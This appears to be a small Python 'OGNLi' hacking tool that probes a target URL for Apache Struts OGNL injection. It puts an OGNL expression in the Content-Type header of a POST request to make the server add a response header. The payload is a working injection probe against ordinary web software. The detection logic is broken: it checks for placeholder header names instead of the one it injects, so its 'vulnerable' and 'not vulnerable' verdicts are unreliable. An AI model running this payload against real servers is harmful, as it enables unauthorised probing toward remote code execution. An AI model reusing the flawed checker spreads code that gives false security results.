import argparse
import requests
from colorama import init, Fore, Style

def display_banner():
    init()  

    banner = f"""
{Fore.GREEN}.-----------------------------.
|{Fore.YELLOW}  Hi Hackers                 {Fore.GREEN}|
|{Fore.YELLOW}  Tool   : OGNLi             {Fore.GREEN}|
|{Fore.YELLOW}  Author : @cyber_karthi     {Fore.GREEN}|
|{Fore.YELLOW}           Jai Hind          {Fore.GREEN}|
{Fore.GREEN}'-----------------------------'
                 ^      (\_/)
                 '----- (O.o)
                        (> <)
"""
    print(banner)
    print(Style.RESET_ALL)  # Reset colorama style

def check_ognl_injection(url):
    headers = {'Content-Type': '%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("Test-Header", "test")}'}

    try:
        resp = requests.post(url, headers=headers)
        vulnerable_headers = ['header1', 'header2']  # List of headers to check for vulnerability

        print("Response Headers:")
        for header in vulnerable_headers:
            if header.lower() in resp.headers:
                print(f"{Fore.RED}Vulnerable header found: {header}")
                print("It is vulnerable to OGNL injection")
                return

        print("Header is not detected")
        print("It is not vulnerable!")

    except requests.RequestException as e:
        print("An error occurred during the request:", e)

def main():
    parser = argparse.ArgumentParser(description="OGNLi Tool")
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    args = parser.parse_args()

    display_banner()
    check_ognl_injection(args.url)

if __name__ == "__main__":
    main()
